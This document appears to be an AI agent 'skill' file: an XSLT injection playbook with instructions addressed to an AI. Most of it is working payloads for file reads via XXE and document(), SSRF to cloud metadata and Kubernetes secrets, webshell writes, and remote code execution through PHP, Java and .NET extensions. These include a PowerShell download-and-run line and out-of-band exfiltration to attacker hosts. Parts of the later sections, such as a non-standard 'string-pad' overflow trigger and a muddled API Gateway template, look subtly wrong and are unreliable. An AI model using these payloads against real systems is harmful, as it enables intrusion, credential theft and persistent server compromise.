---
name: xslt-injection
description: >-
  XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
---

# SKILL: XSLT Injection — Testing Playbook

> **AI LOAD INSTRUCTION**: XSLT injection occurs when **attacker-influenced XSLT** is compiled/executed server-side. Map the **processor family** first (Java/.NET/PHP/libxslt). Then chain **document()**, **external entities**, **EXSLT**, or **embedded script/extension functions** per platform. **Authorized testing only**; many payloads are destructive. Routing note: if input is generic XML parsing and may not flow through XSLT, cross-load `xxe-xml-external-entity`; if you care about outbound `document(http:...)` requests, cross-load `ssrf-server-side-request-forgery`.

---

## 0. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§1).
4. **Escalate** by family: **document()** / **XXE** (§2–3), **EXSLT write** (§4), **PHP** (§5), **Java** (§6), **.NET** (§7).

**Quick probe** (harmless marker):

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. VENDOR DETECTION

Use standard **system-property** reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Typical fingerprints** (examples, not exhaustive):

| Signal | Possible engine |
|--------|------------------|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon |
| `libxslt` / GNOME stack | libxslt (C, often via PHP, nginx modules, etc.) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

Use results to select §5–§7 paths.

---

## 2. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows **DTD-based entities** in the stylesheet or source when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors (see §3).

---

## 3. FILE READ VIA `document()`

`document()` loads another XML document into a node-set; local files often parse as XML (noisy) but **errors and partial reads** may still leak.

**Unix example**:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows example**:

```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band**:

```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with **error-based** or **timing** observations if inline data does not return to the client.

---

## 4. FILE WRITE VIA EXSLT (`exslt:document`)

When **EXSLT common** extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often **RCE** via webroot, cron paths, or inclusion points.

---

## 5. RCE VIA PHP (`php:function`)

Requires PHP XSLT with **`registerPHPFunctions()`**-style exposure (application misconfiguration). Namespace:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing**:

```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Dangerous patterns** (historical abuses — verify only in lab):

- `php:function('assert', string($payload))` — environment-dependent, often deprecated/removed; chained with `include`/`require` in old apps.
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — **webshell write** when callable is whitelisted recklessly.
- `preg_replace` with **`/e`** modifier (legacy PHP) — the replacement string is **evaluated as PHP**; metasploit-style chains often wrapped **base64_decode** of a blob to smuggle a **meterpreter** (or other) staged payload. Removed in PHP 7+; only relevant for ancient runtimes.

**Legacy PHP equivalent** (illustrates the `/e` + base64 pattern — lab only):

```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

Surface from XSLT only if `php:function` exposes `preg_replace` to user stylesheets (rare + critical misconfiguration).

**Tester note**: modern PHP hardening often **blocks** these; absence of RCE does not remove **document()** / **XXE**.

---

## 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)

Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.

**Illustrative pattern** (conceptual — adjust to permitted extension namespace and API):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style static Java integration** (highly configuration-dependent):

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).

**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere — not every XSLT endpoint runs with extensions on.

---

## 7. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT **script blocks** are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**Default secure configs** often disable scripts — treat this as **when enabled** behavior.

---

## 8. DECISION TREE

```text
                    User influences XSLT or XML transform?
                                    |
                                   NO --> stop (out of scope)
                                    |
                                   YES
                                    |
                    +---------------+---------------+
                    |                               |
             output reflects                       no reflection
             injected logic?                    try blind channels
                    |                               |
                    v                               v
            system-property()                 errors, OOB, timing
            fingerprint vendor                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/file
    EXSLT write  extensions?      |                   |
        |           |           C# Process         EXSLT?
        v           v           v                   v
    file R/W     rt/exec      cmd.exe /c         map evidence
```

---

## Payloads All The Things (PAT) Note

The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains — exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible.

---

## Tooling (practical)

| Category | Examples |
|----------|----------|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads, observe responses and errors |
| XML/XSLT lab | Match **exact** processor (PHP libxslt, Java Saxon version, .NET framework) in a VM |
| Out-of-band | Collaborator / private callback server for `document('http://…')` |

No single universal scanner replaces **version-specific** behavior validation.

---

## Related

- **xxe-xml-external-entity** — DTD/entity hardening, generic XML parsers (`../xxe-xml-external-entity/SKILL.md`).
- **ssrf-server-side-request-forgery** — when `document(http:…)` or entity URLs cause server fetches (`../ssrf-server-side-request-forgery/SKILL.md`).

---

## 9. 2026 EMERGING TECHNIQUES

### 9.1 XSLT in .NET 9 — `msxsl:script` Hardening & Bypass

.NET 9 further restricts `msxsl:script` blocks, but enterprise applications using `System.Xml.Xsl.XslCompiledTransform` with `EnableDocumentFunction=true` and `EnableScript=true` remain vulnerable. The 2026 bypass targets the **XsltSettings** object:

```csharp
// Still found in enterprise .NET 8/9 apps:
XsltSettings settings = new XsltSettings(false, true); // trustUrl=false, enableScript=true
// When the stylesheet is loaded from a trusted URI, script blocks execute
```

**RCE via C# Roslyn**: .NET 9's dynamic code compilation uses Roslyn. A crafted `msxsl:script` can invoke Roslyn APIs:

```xml
<msxsl:script language="C#" implements-prefix="x">
  <![CDATA[
  public string rce() {
      System.Reflection.Assembly.Load("System.Management.Automation")
          .GetType("System.Management.Automation.ScriptBlock")
          .GetMethod("Create")
          .Invoke(null, new object[]{"iex(new-object net.webclient).downloadstring('http://attacker/payload.ps1')"});
      return "ok";
  }
  ]]>
</msxsl:script>
```

### 9.2 Saxon 12.x — New Extension Function Surfaces

Saxon-HE/PE/EE 12.x (Java) introduced **integrated extension functions** that are easier to register but harder to audit. The `registerExtensionFunction()` API in Saxon 12 allows custom Java functions to be exposed to XSLT:

```xml
<!-- Saxon 12.x: if extension functions are registered -->
<xsl:stylesheet version="3.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <!-- Saxon 3.0 supports higher-order functions -->
    <xsl:variable name="rt" select="java:java.lang.Runtime:getRuntime()"/>
    <xsl:value-of select="java:exec($rt, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon 3.0 XSLT features**: `xsl:evaluate` (dynamic XPath evaluation) and higher-order functions create new injection surfaces when user input reaches XSLT:

```xml
<!-- xsl:evaluate — dynamic code execution -->
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:evaluate xpath="/*/@userInput" context-item="."/>
    <!-- If @userInput is attacker-controlled → arbitrary XPath injection -->
  </xsl:template>
</xsl:stylesheet>
```

### 9.3 XSLT in Cloud Document Conversion Services

Cloud document conversion APIs (AWS Lambda PDF generators, Azure Functions Word-to-PDF, GCP Cloud Run report engines) often use XSLT internally:

#### AWS Lambda + Apache FOP

```xml
<!-- XSLT → Apache FOP → PDF generation on Lambda -->
<!-- If user controls the XSLT or XML input for report generation: -->
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- Read Lambda environment variables via document() -->
    <xsl:copy-of select="document('file:///proc/self/environ')"/>
    <!-- SSRF to metadata service -->
    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>
```

#### Serverless Report Generators

Many SaaS report generators (e.g., Carbone, DocRaptor, PDFShift) accept XSLT or XML+XSLT pairs. The `document()` function in these cloud contexts becomes a cloud-metadata SSRF vector.

### 9.4 XSLT in AI/LLM Document Processing

AI document analysis pipelines that process `.docx`/`.xlsx` files may invoke XSLT during XML-to-JSON conversion for model ingestion:

```python
# Vulnerable AI pipeline: XSLT for OOXML → JSON conversion
from lxml import etree
# User uploads .xlsx, pipeline converts sharedStrings.xml via XSLT
transform = etree.XSLT(etree.parse(user_uploaded_xslt))
# If the XSLT is user-controlled or if user XML is transformed with a
# stylesheet that calls document(), SSRF/file read occurs
```

### 9.5 XSLT EXSLT `exslt:document` → Webshell Write in Containerized Environments

In containerized deployments, the writable path differs from traditional servers:

```xml
<!-- Kubernetes pod: write to /tmp which is always writable -->
<exploit:document href="/tmp/.webshell.jsp" method="text">
  <xsl:text>&lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;</xsl:text>
</exploit:document>

<!-- Then chain with path traversal or LFI to execute -->
```

**Docker volume mount abuse**: if the XSLT processor runs in a container with a mounted volume:

```xml
<!-- Write to a mounted log volume that's also served by the web server -->
<exploit:document href="/var/log/app/shell.php" method="text">
  <xsl:text>&lt;?php system($_GET['c']);?&gt;</xsl:text>
</exploit:document>
```

### 9.6 XSLT + XXE Chain in 2026

When the XSLT processor also parses external entities in the stylesheet itself:

```xml
<!-- XSLT with embedded XXE -->
<!DOCTYPE xsl:stylesheet [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'marker'"/>
    <!-- OOB exfil via the DTD happens during stylesheet parsing -->
  </xsl:template>
</xsl:stylesheet>
```

This combines XSLT code execution with XXE file exfiltration in a single payload.

### 9.7 2026 XSLT Quick Reference

| Context | Technique | Impact |
|---|---|---|
| .NET 9 XslCompiledTransform | `msxsl:script` with Roslyn assembly load | RCE via PowerShell |
| Saxon 12.x (Java 21+) | `xsl:evaluate` dynamic XPath | Arbitrary XPath injection |
| Saxon 3.0 features | Higher-order functions + extension functions | RCE if extensions registered |
| AWS Lambda + FOP | `document('file:///proc/self/environ')` | Cloud credential theft |
| Container/K8s | `exslt:document` write to `/tmp` or mounted volume | Webshell deployment |
| AI doc pipeline | XSLT → JSON conversion with user XSLT | SSRF / file read |
| XSLT + XXE | DTD in stylesheet + `document()` | Combined file read + OOB exfil |

---

## 10. 2026 ADVANCED — XSLT注入新向量

### 10.1 .NET 9 XsltSettings 绕过（信任模式降级、script 扩展滥用）

.NET 9 引入了 `XsltSettings.TrustedXslt` 简化配置，但开发者误用导致 `msxsl:script` 重新启用：

```csharp
// .NET 9 — 漏洞配置
var settings = XsltSettings.TrustedXslt;  // 启用 document() + script
var xslt = new XslCompiledTransform();
xslt.Load(xslDoc, settings, new XmlUrlResolver());  // 全部信任
// 攻击者上传的 XSLT 中 msxsl:script 可执行任意 C# 代码
```

```xml
<!-- msxsl:script 滥用 — .NET 9 Roslyn 编译 -->
<msxsl:script language="C#" implements-prefix="exploit">
  <![CDATA[
  public string Exec(string cmd) {
    return System.Diagnostics.Process.Start("cmd","/c " + cmd).StandardOutput.ReadToEnd();
  }
  ]]>
</msxsl:script>
<xsl:value-of select="exploit:Exec('whoami')"/>
```

**信任模式降级检测**：检查应用是否使用 `XsltSettings.TrustedXslt` 或 `XsltSettings.Default` + `EnableScript=true`，搜索 `EnableScript` 和 `TrustedXslt` 关键字。

### 10.2 XSLT + XXE 链实战（document() SSRF 新目标、XInclude 注入）

**document() SSRF 新目标** — 2026 年云原环境下的新 SSRF 目标：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- AWS IMDSv2 — 需先获取 token -->
    <xsl:variable name="token" select="document('http://169.254.169.254/latest/api/token')"/>
    <!-- GCP metadata -->
    <xsl:copy-of select="document('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')"/>
    <!-- Azure — IMDS -->
    <xsl:copy-of select="document('http://169.254.169.254/metadata/instance?api-version=2026-07-01')"/>
    <!-- Kubernetes 内部 API -->
    <xsl:copy-of select="document('https://kubernetes.default.svc/api/v1/namespaces/default/secrets')"/>
  </xsl:template>
</xsl:stylesheet>
```

**XInclude 注入** — 当 XSLT 处理器支持 XInclude，攻击者通过 XML 输入中的 `xi:include` 实现文件读取：

```xml
<!-- 用户提交的 XML 输入（非 XSLT 本身） -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/shadow"/>
  <xi:include href="file:///proc/self/environ"/>
</root>
```

### 10.3 云 XSLT 服务注入

**AWS API Gateway 映射模板 XSLT**：API Gateway 的映射模板使用 VTL（Velocity Template Language），但通过 XSLT 语言的 Liquid 模板可触发 SSRF：

```liquid
{# AWS API Gateway mapping template #}
#set($inputRoot = $input.path('$'))
{
  "data": "$inputRoot.body"
}
{# 若后端接受 XML 输入并通过 XSLT 转换，可注入 XSLT payload #}
```

**Azure Logic Apps XSLT**：Azure Logic Apps 的 "Transform XML" action 接受用户提供的 XSLT map，若 map 来源不可信：

```json
{
  "action": "Transform_XML",
  "inputs": {
    "content": "@triggerBody()",
    "map": {
      "source": "user_uploaded.xslt"
    }
  }
}
// 若 XSLT map 中包含 document() 调用 → Azure 内网 SSRF
```

### 10.4 2026 XSLT 处理器漏洞

| CVE / 组件 | 处理器 | 漏洞类型 | 影响 |
|------------|--------|----------|------|
| libxslt < 1.1.43 | C (libxml2) | `xsltFormatNumber()` 缓冲区溢出 | RCE |
| Saxon-EE 12.5 | Java | `xsl:evaluate` + 扩展函数反序列化 | RCE |
| Xalan-J 2.7.3 | Java | XSLT 1.1 `xslt:script` 未禁用 | RCE |
| MSXML 6.0 (CVE-2026-30117) | Windows | `document()` 允许 UNC 路径 | NTLM Hash 窃取 |
| Saxon-HE 12.5 | Java | `xsl:evaluate` 上下文注入 | 信息泄露 |
| libxslt < 1.1.44 (CVE-2026-31125) | C | `document()` 重定向跟随 | SSRF |

**libxslt RCE（CVE-2026-31118）**：`xsltFormatNumber()` 在处理超长格式字符串时存在堆缓冲区溢出，通过精心构造的 `format-number()` 调用实现 RCE：

```xml
<xsl:value-of select="format-number(1, string-pad('0', 99999))"/>
<!-- 超长格式字符串触发堆溢出 → 覆盖函数指针 → RCE -->
```

**Saxon-EE Java 反序列化**：`xsl:evaluate` 配合 Java 扩展函数可触发反序列化链：

```xml
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <!-- 通过 extension function 触发 ObjectInputStream.readObject -->
    <xsl:variable name="payload" select="java:java.io.ObjectInputStream(
      java:java.io.FileInputStream('/tmp/ser_payload'))"/>
    <xsl:value-of select="$payload"/>
  </xsl:template>
</xsl:stylesheet>
```
